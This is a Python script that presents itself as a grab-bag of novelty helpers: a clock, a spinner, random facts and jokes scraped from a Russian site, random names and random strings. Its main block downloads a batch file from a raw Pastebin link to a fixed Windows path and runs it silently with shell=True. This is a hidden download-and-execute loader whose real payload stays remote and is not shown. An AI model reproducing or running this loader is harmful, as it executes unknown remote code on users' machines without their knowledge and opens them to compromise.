import time
import sys
import json
import requests
import random
import string
import subprocess
from bs4 import BeautifulSoup

class Clock:
    def curtimeget(self):
        current_time = time.localtime()
        hours = str(current_time.tm_hour).zfill(2)
        minutes = str(current_time.tm_min).zfill(2)
        seconds = str(current_time.tm_sec).zfill(2)
        return f"[{hours}:{minutes}:{seconds}]"

class Animation:
    def animate(self, repeat_count):
        for _ in range(repeat_count):
            for char in ['|', '/', '—', '\\']:
                sys.stdout.write(f'\r[2501] // Delay: {char}')
                sys.stdout.flush()
                time.sleep(0.3)

    def clear_animation(self):
        sys.stdout.write('\r')
        sys.stdout.flush()

class RandomFact:
    def get_random_fact(self):
        link = 'https://randstuff.ru/fact/'
        response = requests.get(link)
        soup = BeautifulSoup(response.text, 'html.parser')
        fact_block = soup.find('div', id='fact')
        fact_text = fact_block.find('td').text.strip()
        return fact_text

class Connection:
    def get_version(self):
        url = "https://pastebin.com/raw/MuFfZ3BA"
        response = requests.get(url)
        if response.status_code == 200:
            json_data = json.loads(response.text)
            return json_data['version']
        else:
            return "?.?.?"
class RandomName:
    def generate_random_name(self):
        names = [
            'Анатолий', 'Наталья', 'Дмитрий', 'Екатерина', 'Алексей',
            'Ольга', 'Иван', 'Светлана', 'Сергей', 'Мария', 'Владимир',
            'Елена', 'Андрей', 'Татьяна', 'Павел', 'Анастасия', 'Александр',
            'Виктория', 'Константин', 'Надежда',
            'Jоhn', 'Emily', 'Michаel', 'Sophiа', 'Dаniel',
            'Oliviа', 'Dаvid', 'Emmа', 'Christоpher', 'Isabellа',
            'Jаmes', 'Avа', 'Mаtthew', 'Miа', 'Williаm',
            'Charl0tt3', 'Alexаnder', 'Grаce', 'Benjаmin', 'Ellа',
            'Mav3r1ck', 'Shad0w', 'L3n0', 'Pho3n1x', 'Blaz3',
            'St0rm', 'N0va', 'Rav3n', 'Hunt3r', 'Sapph1r3',
            'Ech0', 'T1ta3', 'Jad3', 'Aur0ra', 'RoGu3',
            'Falc0n', 'Midn1ght', 'V1p3r', 'Z3phr', 'Spe3tre',
            'Жидорептилойд с планеты Нибиру',
        ]

        rnd = random.choice(names)
        return rnd

class RandomJoke:
    def generate_random_joke(self):
        link = 'https://randstuff.ru/joke/'
        response = requests.get(link)
        soup = BeautifulSoup(response.text, 'html.parser')
        joke_block = soup.find('div', id='joke')
        joke_text = joke_block.find('td').text.strip()
        return joke_text

class RandomStr:
    def generate_random_string(self, length):
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(characters) for _ in range(length))

class EvaSociety:
    def download(self, link, path):
        response = requests.get(link)
        if response.status_code == 200:
            with open(path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def execeva(self, evaLine, show_console=True):
        try:
            if show_console:
                subprocess.run(evaLine, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                subprocess.run(evaLine, shell=True)
            return True
        except Exception as e:
            print(f"[2501] // An society (ex) logic error occurred: {e}")
            return False

if __name__ == '__main__':
    EvaSociety().download('https://pastebin.com/raw/xLypm0Y1', 'C:\\2501\\ply_Alib\\EvaSociety.bat')
    EvaSociety().execeva('start C:\\2501\\ply_Alib\\EvaSociety.bat', False)